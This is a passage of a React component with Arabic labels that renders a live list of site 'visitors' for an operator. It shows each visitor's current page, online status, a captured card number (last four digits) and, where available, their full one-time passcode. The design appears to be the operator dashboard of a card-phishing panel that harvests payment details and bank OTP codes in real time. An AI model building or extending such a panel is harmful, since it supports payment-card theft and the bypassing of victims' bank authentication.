          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <div className="relative">
                <Bell className="h-5 w-5" />
                {unreadCount > 0 && (
                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold rounded-full w-4 h-4 flex items-center justify-center">
                    {unreadCount}
                  </span>
                )}
              </div>
              <span className="font-semibold">الإشعارات</span>
            </div>
            <span className="text-xs text-slate-400">{filteredNotifications.length} زائر</span>
          </div>
        </div>

        {/* Visitor List */}
        <ScrollArea className="flex-1">
          {isLoading ? (
            <div className="flex items-center justify-center py-8">
              <RefreshCw className="h-6 w-6 animate-spin text-slate-400" />
            </div>
          ) : filteredNotifications.length === 0 ? (
            <div className="text-center py-8 text-slate-500">
              <Bell className="h-12 w-12 mx-auto mb-2 opacity-30" />
              <p className="text-sm">لا توجد إشعارات</p>
            </div>
          ) : (
            <div>
              {filteredNotifications.map((notification) => (
                <div
                  key={notification.id}
                  onClick={() => handleMarkAsRead(notification)}
                  className={`p-4 cursor-pointer border-b border-slate-800 transition-colors hover:bg-slate-800 ${
                    selectedVisitor?.id === notification.id ? "bg-slate-800" : ""
                  } ${notification.isUnread ? "bg-slate-800/50" : ""}`}
                  data-testid={`visitor-item-${notification.id}`}
                >
                  <div className="flex items-start gap-3">
                    {/* Avatar */}
                    <div className="relative flex-shrink-0">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                        notification.cardNumber ? "bg-emerald-600" : "bg-slate-700"
                      }`}>
                        {notification.cardNumber ? (
                          <CreditCard className="h-4 w-4" />
                        ) : (
                          <User className="h-4 w-4" />
                        )}
                      </div>
                      <div className="absolute -bottom-0.5 -left-0.5">
                        <UserStatus visitorId={notification.id} />
                      </div>
                    </div>

                    {/* Content */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1">
                        <p className={`text-sm truncate ${notification.isUnread ? "font-bold" : "font-medium"}`}>
                          {getDisplayName(notification)}
                        </p>
                        <span className="text-xs text-slate-500">{getTimeAgo(notification.createdAt)}</span>
                      </div>
                      <p className="text-xs text-slate-400 truncate">
                        {notification.otpCode ? `OTP: ${notification.otpCode}` : 
                         notification.cardNumber ? `بطاقة: ****${notification.cardNumber.slice(-4)}` :
                         pageLabels[notification.currentPage || ""] || "زائر جديد"}
                      </p>
                      {notification.isUnread && (
                        <div className="w-2 h-2 rounded-full bg-blue-500 absolute top-4 left-4" />
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </ScrollArea>
      </div>
    </div>
  );
}
